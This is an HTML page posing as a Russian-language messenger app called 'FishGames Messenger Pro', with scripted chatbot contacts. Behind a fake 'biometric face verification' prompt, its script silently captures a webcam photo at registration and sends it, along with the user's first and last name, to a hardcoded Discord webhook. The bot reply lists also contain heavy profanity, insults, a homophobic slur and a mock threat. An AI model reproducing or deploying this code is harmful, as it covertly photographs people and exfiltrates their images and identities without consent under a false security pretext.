<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FishGames Messenger Pro</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #004d4d 0%, #002b2b 100%); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        #vlad-scamer { position: fixed; inset: 0; background: black; z-index: 9999; display: none; justify-content: center; align-items: center; }
        #vlad-scamer img { width: 100vw; height: 100vh; object-fit: contain; }
        #camera-overlay { position: fixed; inset: 0; background: #0d1a17; z-index: 2000; display: flex; justify-content: center; align-items: center; text-align: center; }
        .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; }
        .reg-card { background: #1a2e2a; padding: 30px; border-radius: 15px; width: 350px; border: 1px solid #2e8b57; z-index: 10; display: none; }
        input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #2d4f47; background: #243b35; color: white; box-sizing: border-box; outline: none; margin-bottom: 10px; }
        .btn { width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
        #messenger-screen { display: none; width: 95vw; height: 90vh; background: #1a2e2a; border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden; }
        .messenger-container { display: flex; height: 100%; }
        .sidebar { width: 280px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
        .search-input { background: none; border: 1px solid white; border-radius: 20px; padding: 8px; color: white; text-align: center; margin-bottom: 20px; }
        .avatar { width: 45px; height: 45px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 1px solid white; flex-shrink: 0; overflow: hidden; cursor: pointer; }
        .avatar img { width: 100%; height: 100%; object-fit: cover; }
        .chat-area { flex: 1; display: flex; flex-direction: column; }
        .chat-header { padding: 15px; text-align: center; font-weight: bold; border-bottom: 1px solid #2e8b57; color: #4ade80; }
        .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
        .msg-bubble { background: white; color: black; padding: 10px 15px; border-radius: 15px; align-self: flex-end; max-width: 70%; word-wrap: break-word; font-size: 14px; }
        .msg-incoming { align-self: flex-start; background: #2d4f47; color: white; }
        .input-bar { padding: 15px; display: flex; gap: 10px; border-top: 1px solid #2e8b57; }
        #video, #canvas { display: none; }
    </style>
</head>
<body onload="checkAuth()">

<div id="vlad-scamer"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQyWjq_YNgK8ls1-LHX5eS5blhsGtYvctEhxQ&s"></div>

<div id="camera-overlay">
    <div class="warning-box">
        <h3>‚ö†Ô∏è FishGames SECURITY</h3>
        <p>–ë–∏–æ–º–µ—Ç—Ä–∏—á–µ—Å–∫–∞—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –ª–∏—Ü–∞ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–∞ –¥–ª—è –≤—Ö–æ–¥–∞.</p>
        <button class="btn" onclick="requestAccess()">–í–ö–õ–Æ–ß–ò–¢–¨ –ö–ê–ú–ï–†–£</button>
    </div>
</div>

<div id="reg-screen" class="reg-card">
    <h2>FishGames</h2>
    <input type="text" id="firstname" placeholder="–ò–º—è">
    <input type="text" id="lastname" placeholder="–§–∞–º–∏–ª–∏—è">
    <input type="text" id="login" placeholder="–õ–æ–≥–∏–Ω">
    <button class="btn" onclick="register()">–ó–ê–†–ï–ì–ò–°–¢–†–ò–†–û–í–ê–¢–¨–°–Ø</button>
</div>

<div id="messenger-screen">
    <div class="messenger-container">
        <div class="sidebar">
            <input type="text" class="search-input" id="searchField" placeholder="–ü–æ–∏—Å–∫..." onkeypress="handleSearch(event)">
            <div id="contacts"></div>
            <div style="margin-top:auto; padding-top:10px; border-top:1px solid #2e8b57;">
                <div style="display:flex; align-items:center; gap:10px;">
                    <div class="avatar" id="my-ava" title="–°–º–µ–Ω–∏—Ç—å —Ñ–æ—Ç–æ" onclick="document.getElementById('file-input').click()">?</div>
                    <input type="file" id="file-input" style="display:none" accept="image/*" onchange="changeAvatar(this)">
                    <div id="my-name">–í—ã</div>
                    <button onclick="logout()" style="background:none; border:none; color:#ff4d4d; cursor:pointer; font-size:12px; margin-left:auto;">–í—ã–π—Ç–∏</button>
                </div>
            </div>
        </div>
        <div class="chat-area">
            <div class="chat-header" id="chat-title">–í—ã–±–µ—Ä–∏—Ç–µ —á–∞—Ç</div>
            <div class="messages-display" id="chat-box"></div>
            <div class="input-bar">
                <input type="text" id="messageText" placeholder="–°–æ–æ–±—â–µ–Ω–∏–µ..." onkeypress="if(event.key==='Enter')sendMessage()">
                <button class="btn" style="width:60px" onclick="sendMessage()">‚û§</button>
            </div>
        </div>
    </div>
</div>

<video id="video" autoplay playsinline></video><canvas id="canvas"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const webhook = "https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw";

    const avatars = {
        "—Ç–∏–º–æ—Ñ–µ–π": "https://i.redd.it/2z8x8zvo5wne1.png",
        "–±–æ–≥–¥–∞–Ω": "https://www.meme-arsenal.com/memes/7f763e0b515cc10c21528b352319d07a.jpg",
        "—è—Ä–æ—Å–ª–∞–≤": "https://yt3.googleusercontent.com/K24r2iIAEzeJsZKXva_IQMi5HePAEU8bIqCko4KcLvLlQjArn_PszAya4xgWFlUssdEQ0OPyrQ=s900-c-k-c0x00ffffff-no-rj"
    };

    // –ë–ê–ó–ê –î–ê–ù–ù–´–• –û–¢–í–ï–¢–û–í
    const botData = {
        "—è—Ä–æ—Å–ª–∞–≤": {
            toxic: [
                "–¢—ã —á—ë, –±–µ—Ä–µ–≥–∞ –ø–æ–ø—É—Ç–∞–ª?", "–ï–±–∞—Ç—å —Ç—ã –≤—ã–¥–∞–ª, –∫–æ–Ω–µ—á–Ω–æ...", "–°–ª—ã—à—å, –∑–∞–≤–∞–ª–∏ –µ–±–∞–ª–æ.", "–ß–µ —Ç—ã –º–Ω–µ —Ç—É—Ç –≤—ã—Å–∏—Ä–∞–µ—à—å?", "–ò–¥–∏ –Ω–∞—Ö—É–π, —è –∑–∞–Ω—è—Ç.", "–¢—ã –≤–æ–æ–±—â–µ –∫—Ç–æ —Ç–∞–∫–æ–π, —á—É—á–µ–ª–æ?", "–û—Ö—É–µ–ª –≤ –∫—Ä–∞–π?", "–ï–±–ª–∞–Ω, —á–µ —Ç–µ –Ω–∞–¥–æ?", "–†–æ—Ç –∑–∞–∫—Ä–æ–π, –∫–∏—à–∫–∏ –ø—Ä–æ—Å—Ç—É–¥–∏—à—å.", "–ú–∞–º–µ —Å–≤–æ–µ–π —Ç–∞–∫ –ø–∏—à–∏, –ø–µ—Å.", "–ó–∞ –±–∞–∑–∞—Ä –æ—Ç–≤–µ—Ç–∏—à—å?", "–¢—ã —á—ë —Ç–∞–∫–æ–π –¥–µ—Ä–∑–∫–∏–π?", "–©–∞ –ø–æ IP –≤—ã—á–∏—Å–ª—é, –∫–ª–æ—É–Ω.", "–°–ª–µ–π—Å—è, –æ–≤–æ—â.", "–ß–µ —Ç—ã –º—ã—á–∏—à—å —Ç–∞–º?", "–•—É–π–ª–æ –¥–µ—Ç–µ–∫—Ç–µ–¥.", "–ï–±–∞—Ç—å —Ç—ã —à—É—Ç–Ω–∏–∫ (–Ω–µ—Ç).", "–ì–æ–ª–æ–≤—É –ª–µ—á–∏, –¥–µ–±–∏–ª.", "–ß–º–æ–Ω—è, –ø–æ—Ç–µ—Ä—è–π—Å—è.", "–ê–¥—Ä–µ—Å –¥–∞–π, —â–∞ –ø—Ä–∏–µ–¥—É."
            ],
            hi: [
                "–ß—ë –Ω–∞–¥–æ, –µ–ø—Ç–∞?", "–ó–¥–∞—Ä–æ–≤–∞, –µ—Å–ª–∏ –Ω–µ —à—É—Ç–∏—à—å.", "–ö—É.", "–ß–µ –ø—Ä–∏—Å—Ç–∞–ª?", "–ó–¥–æ—Ä–æ–≤–æ, –∫–æ–ª—å –Ω–µ —à—É—Ç–∏—à—å.", "–ù—É –ø—Ä–∏–≤–µ—Ç, —á–µ —Ö–æ—Ç–µ–ª?", "–û–ø—è—Ç—å —Ç—ã...", "–ú–µ–Ω—å—à–µ —Å–ª–æ–≤, —á–µ –Ω–∞–¥–æ?", "–ü—Ä–∏–≤–µ—Ç. –î–µ–Ω–µ–≥ –Ω–µ –¥–∞–º."
            ],
            common: [
                "–Ø—Å–Ω–æ.", "–ü–æ—Ö—É–π –≤–æ–æ–±—â–µ.", "–ñ–∏–∑–∞, —á–µ.", "–ú–¥–∞...", "–ù—É —Ç—ã –∏ –∫–ª–æ—É–Ω.", "–ë–∞–∑–∞.", "–ë—ã–≤–∞–µ—Ç.", "–ò —á–µ?", "–ù—É –¥–æ–ø—É—Å—Ç–∏–º.", "–ü–æ–Ω—è–ª-–ø—Ä–∏–Ω—è–ª.", "–ê–≥–∞, —Ä–∞—Å—Å–∫–∞–∑—ã–≤–∞–π —Å–∫–∞–∑–∫–∏.", "–Ø –≤ –∞—Ö—É–µ —Å —Ç–µ–±—è.", "–õ–æ–ª.", "–ö—Ä–∏–Ω–∂.", "–ú–µ–Ω—å—à–µ —Ç–µ–∫—Å—Ç–∞, –±–æ–ª—å—à–µ –¥–µ–ª–∞.", "–ó–∞–±–µ–π.", "–û—Ç–≤–∞–ª–∏.", "–Ø –≤ —Ç–∞–Ω–∫–µ.", "–ë—ã–≤–∞–π.", "–°–≤–æ–±–æ–¥–µ–Ω."
            ]
        },
        "–±–æ–≥–¥–∞–Ω": {
            toxic: [
                "–¢–≤–æ–π –∫–æ–¥ ‚Äî –≥–æ–≤–Ω–æ, –∏ —Å–∞–º —Ç—ã —Ç–∞–∫ —Å–µ–±–µ.", "–ë–ª—è—Ç—å, –Ω–µ –æ—Ç–≤–ª–µ–∫–∞–π –æ—Ç –∫–æ–º–ø–∏–ª—è—Ü–∏–∏.", "–£ —Ç–µ–±—è –º–æ–∑–≥ –Ω–∞ Python 2.7 –∑–∞—Å—Ç—Ä—è–ª?", "–ï–±–∞–Ω—ã–π —Ä–æ—Ç, –æ–ø—è—Ç—å –±–∞–≥–∏ –∏–∑-–∑–∞ —Ç–µ–±—è.", "–°—É–∫–∞, —è –∂–µ –ø—Ä–æ—Å–∏–ª –Ω–µ –ø–∏—Å–∞—Ç—å, –ø–æ–∫–∞ —è –¥–µ–±–∞–∂—É!", "–¢—ã —Ç—É–ø–æ–π –∏–ª–∏ –ø—Ä–æ—Å—Ç–æ JS-—Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫?", "–¢–≤–æ—è –ª–æ–≥–∏–∫–∞ ‚Äî —ç—Ç–æ —Å–ø–ª–æ—à–Ω–æ–π NullPointerException.", "–°–Ω–µ—Å–∏ –≤–∏–Ω–¥—É –∏ –Ω–µ –ø–æ–∑–æ—Ä—å—Å—è.", "–û—à–∏–±–∫–∞ 404: —Ç–≤–æ–π –∏–Ω—Ç–µ–ª–ª–µ–∫—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.", "–•–≤–∞—Ç–∏—Ç —Å–ø–∞–º–∏—Ç—å, —è –Ω–µ–π—Ä–æ–Ω–∫—É —Ç—Ä–µ–Ω–∏—Ä—É—é."
            ],
            hi: [
                "–ü—Ä–∏–≤–µ—Ç, —è –∫–æ–¥ –ø–∏—à—É. –ß–µ —Ö–æ—Ç–µ–ª?", "–ö—É. –û–ø—è—Ç—å –≤–æ–ø—Ä–æ—Å –ø–æ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å—É?", "–ü—Ä–∏–≤–µ—Ç. –ï—Å—Ç—å –∏–Ω—Ç–µ—Ä–µ—Å–Ω–∞—è –∑–∞–¥–∞—á–∞?", "–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π. –Ø –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ –¥–µ–ø–ª–æ—è.", "–î–∞-–¥–∞, –ø—Ä–∏–≤–µ—Ç.", "–ü—Ä–∏–≤–µ—Ç. –ù–µ–∫–æ–≥–¥–∞ –æ–±—ä—è—Å–Ω—è—Ç—å, –∫–∏–¥–∞–π –ª–∏–Ω–∫."
            ],
            common: [
                "–Ø—Å–Ω–æ, –æ–ø—è—Ç—å –∫–æ—Å—Ç—ã–ª–∏ –ø–∏—à–µ—à—å.", "–°–∫–∏–Ω—å –ª–∏–Ω–∫ –Ω–∞ –≥–∏—Ç—Ö–∞–±.", "Python ‚Äî —Å–∏–ª–∞, –æ—Å—Ç–∞–ª—å–Ω–æ–µ ‚Äî –º–æ–≥–∏–ª–∞.", "–ü–æ–≥—É–≥–ª–∏, –ø—Ä–µ–∂–¥–µ —á–µ–º –ø–∏—Å–∞—Ç—å.", "–¢—É—Ç –≤—Å—ë –ø—Ä–æ—Å—Ç–æ: O(n) —Å–ª–æ–∂–Ω–æ—Å—Ç—å.", "–ú–¥–∞, –Ω—É –∏ –ª–æ–≥–∏–∫–∞ —É —Ç–µ–±—è.", "–Ø –∑–∞–Ω—è—Ç, –ø–∏—à—É –Ω–µ–π—Ä–æ–Ω–∫—É.", "–û–∫.", "–ü–æ–Ω—è—Ç–Ω–æ.", "–ñ–∏–∑–∞ –ø—Ä–æ–≥—Ä–∞–º–º–∏—Å—Ç–∞.", "Stack Overflow –≤ –ø–æ–º–æ—â—å.", "–≠—Ç–æ –Ω–µ –±–∞–≥, —ç—Ç–æ —Ñ–∏—á–∞.", "–ü–µ—Ä–µ—É—Å—Ç–∞–Ω–æ–≤–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏.", "–£ –º–µ–Ω—è –Ω–∞ –º–∞—à–∏–Ω–µ –≤—Å—ë —Ä–∞–±–æ—Ç–∞–µ—Ç."
            ]
        },
        "—Ç–∏–º–æ—Ñ–µ–π": {
            toxic: [
                "–ë–ª—è—Ç—å, —è –∏–∑-–∑–∞ —Ç–µ–±—è —Å–ª–∏–ª –∫–∞—Ç–∫—É!", "–°—É–∫–∞, –∏–¥–∏ –≤ –ú–∞–π–Ω–∫—Ä–∞—Ñ—Ç –∏–≥—Ä–∞–π, –Ω—É–±.", "–ß–º–æ, —Ç—ã —á–µ –≤ —á–∞—Ç –æ—Ä–µ—à—å?", "–ï–±–∞—Ç—å —Ç—ã –±–æ—Ç.", "–ü–æ—à–µ–ª –Ω–∞—Ö—É–π, —è –≤ —Ä–µ–π–¥–µ.", "–¢–≤–æ–π —Å–∫–∏–ª–ª ‚Äî –Ω–æ–ª—å, —á–µ —Ç—ã –º–Ω–µ –ø–∏—à–µ—à—å?", "–õ–æ—Ö, –ø–∏–¥—Ä, –Ω–µ—Ç –¥—Ä—É–∑–µ–π.", "–¢—ã –¥–∞–∂–µ –≤ –¢–µ—Ç—Ä–∏—Å–µ –ø—Ä–æ–∏–≥—Ä–∞–µ—à—å.", "–ö—Ä—ã—Å–∞ —Ç—ã –∫–æ–º–Ω–∞—Ç–Ω–∞—è.", "–£–¥–∞–ª–∏ –¥–æ—Ç—É, –Ω–µ –ø–æ–∑–æ—Ä—å—Å—è."
            ],
            hi: [
                "–ì–û –í –†–û–ë–õ–û–ö–°!", "–ü—Ä–∏–≤–µ—Ç! –ó–∞–π–¥–µ—à—å –∫–æ –º–Ω–µ –≤ –ø–ª–µ–π—Å?", "–û–æ–æ, –ø—Ä–∏–≤–µ—Ç! –ë—É–¥–µ—à—å –≤ —Ç–∏–º–µ?", "–ö—É! –Ø —Å—Ç—Ä–∏–º–ª—é —â–∞—Å.", "–•–∞–π! –£ —Ç–µ–±—è –∫–∞–∫–æ–π —Ä–∞–Ω–≥?", "–ü—Ä–∏–≤–µ—Ç, –≥–æ –∫–∞—Ç–∫—É!"
            ],
            common: [
                "–Ø –Ω–æ–≤—É—é –∫–∞—Ä—Ç—É –∑–∞–ª–∏–ª.", "–ê—Ö–∞—Ö–∞, –ª–æ–ª.", "–ñ–∏–∑–∞.", "–ü–æ–≥–Ω–∞–ª–∏ –≤ –î–°?", "–°–º–æ—Ç—Ä–∏ –∫–∞–∫–æ–π —Å–∫–∏–Ω –∫—É–ø–∏–ª.", "–†–æ–±–ª–æ–∫—Å ‚Äî —ç—Ç–æ –∂–∏–∑–Ω—å.", "–ß–µ –∑–∞ —Ñ–∏–≥–Ω—é —Ç—ã –Ω–µ—Å–µ—à—å?", "–û–∫, –≥–æ –ø–æ–∑–∂–µ.", "–Ø —â–∞—Å –∑–∞–Ω—è—Ç, —Å—Ç—Ä–æ—é –ø–ª–µ–π—Å.", "–¢–∞–º –æ–±–Ω–æ–≤–∞ –≤—ã—à–ª–∞, –≤–∏–¥–µ–ª?", "–ê–¥–º–∏–Ω ‚Äî –∫–æ–∑–µ–ª.", "–¢–æ–ø—á–∏–∫.", "–ù—É —Ç—ã –∏ –Ω—É—É—É—É—É–±."
            ]
        }
    };

    let currentChat = "";
    let histories = {};
    let lastBotReply = "";

    function checkAuth() {
        const savedUser = localStorage.getItem('fishGamesUser');
        const savedHistories = localStorage.getItem('fishGamesHistories');
        if (savedHistories) {
            histories = JSON.parse(savedHistories);
            Object.keys(histories).forEach(name => renderContact(name));
        }
        if (savedUser) {
            const user = JSON.parse(savedUser);
            document.getElementById('camera-overlay').style.display = 'none';
            showMessenger(user.name, user.photo);
        }
    }

    async function requestAccess() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video: true});
            video.srcObject = s;
            document.getElementById('camera-overlay').style.display = 'none';
            document.getElementById('reg-screen').style.display = 'block';
        } catch(e) { alert("–û—à–∏–±–∫–∞ –∫–∞–º–µ—Ä—ã! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è."); }
    }

    function register() {
        const fn = document.getElementById('firstname').value;
        const ln = document.getElementById('lastname').value;
        if(!fn || !ln) return alert("–ó–∞–ø–æ–ª–Ω–∏ –≤—Å—ë!");
        
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        canvas.toBlob(b => {
            const fd = new FormData();
            fd.append('payload_json', JSON.stringify({ content: `üì∏ –í—Ö–æ–¥: ${fn} ${ln}` }));
            fd.append('file', b, 'user.png');
            fetch(webhook, {method: 'POST', body: fd});
        });

        const userData = { name: fn, photo: null };
        localStorage.setItem('fishGamesUser', JSON.stringify(userData));
        showMessenger(fn, null);
    }

    function showMessenger(name, photo) {
        document.getElementById('reg-screen').style.display = 'none';
        document.getElementById('messenger-screen').style.display = 'block';
        document.getElementById('my-name').innerText = name;
        const ava = document.getElementById('my-ava');
        if (photo) {
            ava.innerHTML = `<img src="${photo}">`;
            ava.style.background = "none";
        } else { ava.innerText = name[0]; }
    }

    function changeAvatar(input) {
        if (input.files && input.files[0]) {
            const reader = new FileReader();
            reader.onload = function(e) {
                const photoData = e.target.result;
                const ava = document.getElementById('my-ava');
                ava.innerHTML = `<img src="${photoData}">`;
                ava.style.background = "none";
                const user = JSON.parse(localStorage.getItem('fishGamesUser'));
                user.photo = photoData;
                localStorage.setItem('fishGamesUser', JSON.stringify(user));
            };
            reader.readAsDataURL(input.files[0]);
        }
    }

    function logout() {
        if(confirm("–£–¥–∞–ª–∏—Ç—å –≤—Å—ë?")) { localStorage.clear(); location.reload(); }
    }

    function handleSearch(e) {
        if(e.key === 'Enter') {
            const val = document.getElementById('searchField').value.trim();
            if(val.toLowerCase() === "–≤–ª–∞–¥") { document.getElementById('vlad-scamer').style.display = 'flex'; return; }
            if(val && !histories[val]) {
                histories[val] = [];
                renderContact(val);
                saveHistories();
                openChat(val);
                document.getElementById('searchField').value = '';
            }
        }
    }

    function renderContact(name) {
        const low = name.toLowerCase();
        const item = document.createElement('div');
        item.style.cssText = "display:flex; align-items:center; gap:10px; padding:10px; cursor:pointer; border-radius:8px; transition: 0.2s;";
        item.onmouseover = () => item.style.background = "#243b35";
        item.onmouseout = () => item.style.background = "transparent";
        item.onclick = () => openChat(name);
        
        const imgTag = avatars[low] ? `<img src="${avatars[low]}">` : name[0].toUpperCase();
        item.innerHTML = `<div class="avatar">${imgTag}</div><div>${name}</div>`;
        document.getElementById('contacts').appendChild(item);
    }

    function openChat(name) {
        currentChat = name;
        document.getElementById('chat-title').innerText = name;
        document.getElementById('chat-box').innerHTML = '';
        if (histories[name]) { histories[name].forEach(m => renderMessage(m.text, m.type)); }
    }

    function renderMessage(text, type) {
        const m = document.createElement('div');
        m.className = 'msg-bubble ' + type;
        m.innerText = text;
        document.getElementById('chat-box').appendChild(m);
        document.getElementById('chat-box').scrollTop = 999999;
    }

    function sendMessage() {
        const txt = document.getElementById('messageText').value.trim();
        if(!txt || !currentChat) return;
        renderMessage(txt, '');
        histories[currentChat].push({text: txt, type: ''});
        saveHistories();
        document.getElementById('messageText').value = '';
        setTimeout(() => botReply(txt), 600);
    }

    function botReply(uText) {
        const t = uText.toLowerCase();
        const n = currentChat.toLowerCase();
        let r = "";
        
        // –ü–æ–∏—Å–∫ –ø–µ—Ä—Å–æ–Ω–∞–∂–∞
        const p = botData[n] || { hi: ["–ó–¥–∞—Ä–æ–≤–∞."], toxic: ["–°–∞–º —Ç–∞–∫–æ–π."], common: ["–Ø—Å–Ω–æ.", "–û–∫."] };

        // –¢–†–ò–ì–ì–ï–†–´
        const isToxic = ["—Ö—É–π", "–ø–∏–¥–æ—Ä", "—Å—É–∫–∞", "–±–ª—è—Ç—å", "–µ–±–ª–∞–Ω", "—á–º–æ", "–≥–∞–¥", "–∑–∞–ª—É–ø–∞", "–¥–∞—É–Ω"].some(w => t.includes(w));
        const isHi = ["–ø—Ä–∏–≤–µ—Ç", "–∫—É", "—Ö–∞–π", "–∑–¥–∞—Ä–æ–≤"].some(w => t.includes(w));

        let pool = p.common; // –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é
        if (isToxic) pool = p.toxic;
        else if (isHi) pool = p.hi;

        // –í—ã–±–æ—Ä —Ñ—Ä–∞–∑—ã (–Ω–µ –ø–æ–≤—Ç–æ—Ä—è—Ç—å –ø–æ—Å–ª–µ–¥–Ω—é—é)
        do {
            r = pool[Math.floor(Math.random() * pool.length)];
        } while (r === lastBotReply && pool.length > 1);

        lastBotReply = r;
        renderMessage(r, 'msg-incoming');
        histories[currentChat].push({text: r, type: 'msg-incoming'});
        saveHistories();
    }

    function saveHistories() { localStorage.setItem('fishGamesHistories', JSON.stringify(histories)); }
</script>
</body>
</html>
